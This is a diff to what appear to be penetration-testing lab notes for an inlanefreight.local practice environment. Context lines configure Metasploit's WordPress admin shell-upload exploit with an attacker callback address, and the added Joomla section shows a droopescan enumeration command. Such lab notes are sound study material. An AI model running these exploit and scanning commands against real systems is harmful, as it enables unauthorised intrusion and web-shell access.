@@ -34,3 +34,15 @@ msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.15
 msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.42.195  
 msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local
 ```
+
+## Joomla
+
+### Enumeration
+
+[droopescan](https://github.com/droope/droopescan), a plugin-based scanner that works for SilverStripe, WordPress, and Drupal with limited functionality for Joomla and Moodle.  
+
+```
+droopescan scan joomla --url http://dev.inlanefreight.local/
+```
+
+
